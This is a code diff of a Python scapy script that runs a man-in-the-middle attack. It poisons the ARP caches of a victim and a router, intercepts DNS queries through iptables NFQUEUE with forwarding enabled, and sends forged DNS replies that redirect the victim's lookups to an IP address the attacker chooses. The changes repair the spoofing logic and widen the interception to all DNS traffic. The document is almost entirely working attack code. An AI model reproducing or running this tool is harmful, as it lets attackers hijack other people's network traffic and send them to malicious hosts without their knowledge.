@@ -36,17 +36,20 @@ def poison(victim_pkt, router_pkt):
         print('corruping victim')
         send(victim_pkt, verbose = False, iface = "enp0s3")
         
-        time.sleep(5)
+        time.sleep(2)
 
         print('corrupting router')
         send(router_pkt, verbose = False, iface = "enp0s3")
 
 def packet_listener(packet):
     scapy_packet = IP(packet.get_payload() )
-    print(scapy_packet)
+    #print(scapy_packet)
 
+    if (scapy_packet.haslayer(TCP)):
+        tcp_layer = scapy_packet[TCP]
+        print(tcp_layer)
 
-    if (scapy_packet.haslayer(DNS) and scapy_packet[DNS].qr == 1):
+    if (scapy_packet.haslayer(DNS) and scapy_packet[DNS].qr == 0):
         print('DNS RESPONSE')
         dns_response = scapy_packet[DNS]
         print('-----------------------------')
@@ -58,19 +61,18 @@ def packet_listener(packet):
         qname = dns_response.qd.qname
         qd = dns_response.qd
 
-        dport = scapy_packet[UDP].dport
+        sport = scapy_packet[UDP].sport
 
-        packet.drop()
 
 
         dns_layer = DNS(id = query_id, qr = 1, aa = 1, ancount = 1,
                         qd = qd,
-                        an = DNSRR(rrname = qname, ttl = 20, rdata = '127.0.0.1'))
+                        an = DNSRR(rrname = qname, ttl = 20, rdata = '157.240.8.35'))
 
 
-        new_packet = IP(dst=victim_ip_addr, src = router_ip_addr) / UDP(sport = 53, dport = dport) / dns_layer
+        new_packet = IP(dst=victim_ip_addr, src = router_ip_addr) / UDP(sport = 53, dport = sport) / dns_layer
 
-        print('NEW PACKET', new_packet)
+        #print('NEW PACKET', new_packet)
 
         del new_packet[IP].len 
         del new_packet[IP].chksum 
@@ -78,7 +80,11 @@ def packet_listener(packet):
         del new_packet[UDP].len 
         del new_packet[UDP].chksum
         
-        sr1(new_packet)
+        send(new_packet, iface = "enp0s3", verbose=False)
+        packet.accept()
+        return 
+
+    packet.accept()
 
 
 
@@ -105,7 +111,7 @@ def packet_sniff(victim_mac_addr, router_mac_addr, attacker_mac_addr):
 def main():
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     os.system('iptables -F')
-    os.system('iptables -I FORWARD -p udp --dport 53 -d 192.168.0.198/24 -j NFQUEUE --queue-num 1')
+    os.system('iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 1')
 
     ether = Ether()
     attacker_mac_addr = ether.src
